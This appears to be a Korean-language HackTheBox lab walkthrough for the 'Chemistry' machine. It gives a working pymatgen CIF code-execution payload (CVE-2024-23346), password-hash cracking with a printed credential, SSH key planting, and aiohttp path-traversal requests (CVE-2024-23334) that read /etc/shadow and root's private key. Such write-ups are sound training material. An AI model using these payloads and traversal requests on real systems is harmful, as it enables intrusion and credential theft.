# Chemistry - HackTheBox
## Recon
```bash
sudo nmap -p 22,5000 -sC -sV -vv -oA chemistry 10.10.11.38
```
<img width="1104" height="416" alt="image" src="https://github.com/user-attachments/assets/f669361e-e399-4ae4-80f2-d81cb761dd31" />

- SSH(22)
- HTTP(5000)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.11.38:5000

curl -IL http://10.10.11.38:5000
```
<img width="1107" height="282" alt="image" src="https://github.com/user-attachments/assets/5cdf366d-90de-44ba-bd3a-4100f838a1c1" />

### CVE-2024-23346
- 계정을 생성하여 로그인.
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/90f4a1d0-6500-4a78-8cf6-689d5ea328f5" />

<br>
<br>

- `CIF`파일이 아닌 다른 확장자를 업로드 할 시 오류.
<img width="1100" height="152" alt="image" src="https://github.com/user-attachments/assets/ae97dbde-920f-4068-9c51-1e99c0a1853b" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2024-23346
<img width="1100" height="488" alt="image" src="https://github.com/user-attachments/assets/f96a85fa-1350-4060-afba-8bddc66ae295" />

<br>
<br>

- https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346
- `eval`함수를 사용하고 있어 임의의 명령어 실행이 가능해짐
<img width="1100" height="553" alt="image" src="https://github.com/user-attachments/assets/e78bc7da-7b3b-49e4-b83d-6c4f49e5a152" />

<br>
<br>

- https://www.exploit-db.com/exploits/52205
- `Pymatgen`의 정확한 버전은 알 수 없으나 해당 `CIF`파일로 핑테스트 시도.
```
data_5yOhtAoR
_audit_creation_date            2024-11-13
_audit_creation_method          "CVE-2024-23346 Pymatgen CIF Parser Reverse Shell Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping 10.10.16.4");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
<img width="1105" height="345" alt="image" src="https://github.com/user-attachments/assets/3731c2d1-6308-4b38-8222-85e5846ac4ff" />

<br>
<br>

- `test.cif` 업로드하여 `view`클릭.
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/e7cf02d8-b61e-4dcb-9dde-ce25207a1ddc" />

<br>
<br>

- ping test 성공.
<img width="1105" height="236" alt="image" src="https://github.com/user-attachments/assets/da6f480e-815f-4b5d-8a32-b28608db2506" />

<br>
<br>

- `ex.sh`를 생성.
<img width="1105" height="88" alt="image" src="https://github.com/user-attachments/assets/a502e066-f9b4-4259-b154-e067b0815455" />

<br>
<br>

- 로컬로부터 다운로드 받아서 실행.
```
data_5yOhtAoR
_audit_creation_date            2024-11-13
_audit_creation_method          "CVE-2024-23346 Pymatgen CIF Parser Reverse Shell Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash /tmp/ex.sh");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
<img width="1105" height="338" alt="image" src="https://github.com/user-attachments/assets/1184341d-f6db-40dd-8fc8-42c375b76ba2" />

<br>
<br>

- 셸 획득.
<img width="1105" height="185" alt="image" src="https://github.com/user-attachments/assets/331dfdea-773a-4ed1-9791-9d2a3ff64026" />

---
## Privesc
- `/home/app/instance`에서 `database.db`파일 발견.
<img width="1105" height="98" alt="image" src="https://github.com/user-attachments/assets/744daf1f-ff3a-47a9-bd2e-b3dce4878fcf" />

<br>
<br>

- 로컬로 파일을 옮긴 후 `sqlite3`로 `user`테이블 내용 확인하여 계정 정보 획득.
```
sqlite3 database.db

sqlite> .headers on

sqlite> .mode column

sqlite> .tables

sqlite> select * from user;
```
<img width="1100" height="419" alt="image" src="https://github.com/user-attachments/assets/e0a61828-d8a9-4002-bc71-1ebedd4232ff" />

<br>
<br>

- `/home/app/app.py`에서 `md5`로 암호화 되는 것 확인.
<img width="1105" height="317" alt="image" src="https://github.com/user-attachments/assets/5a98fb14-48c7-4371-a17a-67349d464865" />

<br>
<br>

- 크래킹 진행하여 여러 비밀번호 획득.
```bash
hashcat -m 0 hash ~/util/rockyou.txt --user --show
```
<img width="1105" height="131" alt="image" src="https://github.com/user-attachments/assets/5a8807eb-f4fc-46c7-8087-4e9404fa8f70" />

<br>
<br>

- `/etc/passwd`에서 `rosa`유저 발견.
<img width="1105" height="84" alt="image" src="https://github.com/user-attachments/assets/b75664c2-355f-43c3-907d-74ce4244a432" />

<br>
<br>

- `rosa:unicorniosrosados` 로그인.
```bash
su - rosa
```
<img width="1105" height="82" alt="image" src="https://github.com/user-attachments/assets/305df9cd-0050-4cf1-ae18-f490ea4ee243" />

<br>
<br>

- 8080포트가 열려 있어 `curl`로 확인.
```bash
ss -tnlp

curl http://127.0.0.1:8080
```
<img width="1105" height="553" alt="image" src="https://github.com/user-attachments/assets/1f979c44-8329-4ca2-91f7-dbf66e0ab485" />

<br>
<br>

- `/home/rosa/.ssh/authorized_keys`에 로컬의 공개키 저장.
```bash
echo ‘ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKeRiGuWWamvfr+ym0HgK+DcR5HpjLAVA3rFiWdC6yb3 kali@kali’ >> authorized_keys
```
<img width="1105" height="41" alt="image" src="https://github.com/user-attachments/assets/a9a7f182-9e95-46f6-8505-1bd33ea5fc2d" />

<br>
<br>

- `SSH`로 8080포트 포워딩.
```bash
ssh -L 8080:localhost:8080 rosa@10.10.11.38
```
<img width="1105" height="287" alt="image" src="https://github.com/user-attachments/assets/6aadd7b5-1c00-41ef-a8ba-b60c6b9fa1ae" />

<br>
<br>

### banner grabbing
```bash
whatweb http://127.0.0.1:8080

curl -IL http://127.0.0.1:8080
```
<img width="1105" height="249" alt="image" src="https://github.com/user-attachments/assets/0c85ea64-ccf5-4240-ab28-f305b7010027" />

### CVE-2024-23334
- `aiohttp 3.9.1`
- `follow_symlinks`옵션이 설정되어 있을 경우 directory traversal이 가능한 취약점.
<img width="1100" height="555" alt="image" src="https://github.com/user-attachments/assets/dffc4036-d5aa-49eb-9508-217d7e7d8225" />

<br>
<br>

- https://github.com/jhonnybonny/CVE-2024-23334/blob/main/exploit.py
- 위 스크립트에서는 `/static` 경로로 exploit을 실행하였으나 서버에서는 `/static`경로가 없었음.
- `gobuster`로 `/assets` 경로를 발견.
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://127.0.0.1:8080
```
<img width="1105" height="355" alt="image" src="https://github.com/user-attachments/assets/03807cda-1d5b-4865-8b29-a1344c43f6ef" />

<br>
<br>

- 해당 경로로 `/etc/shaow` 요청하여 성공.
```bash
curl -s --path-as-is 'http://127.0.0.1:8080/assets/../../../etc/shadow'
```
<img width="1105" height="83" alt="image" src="https://github.com/user-attachments/assets/e4e98e29-47c6-4905-9818-4c0250e1852e" />

<br>
<br>

- `root`의 `id_rsa` 획득.
```bash
curl -s --path-as-is 'http://127.0.0.1:8080/assets/../../../root/.ssh/id_rsa'
```
<img width="1105" height="257" alt="image" src="https://github.com/user-attachments/assets/9e0233bb-0fdc-427e-921b-35271de4ef22" />

<br>
<br>

- `root`계정으로 로그인.
```bash
ssh -i id_rsa root@10.10.11.38
```
<img width="1105" height="633" alt="image" src="https://github.com/user-attachments/assets/8b721604-09d9-4520-9fc9-d5eacd8cdf93" />

---
## FLAG
- `/home/rosa/user.txt`
<img width="1105" height="289" alt="image" src="https://github.com/user-attachments/assets/5e1019d0-b462-4520-ab7b-c22b4e365729" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="252" alt="image" src="https://github.com/user-attachments/assets/300119f9-f44e-4a18-91a6-ce62a1a8e7c6" />




























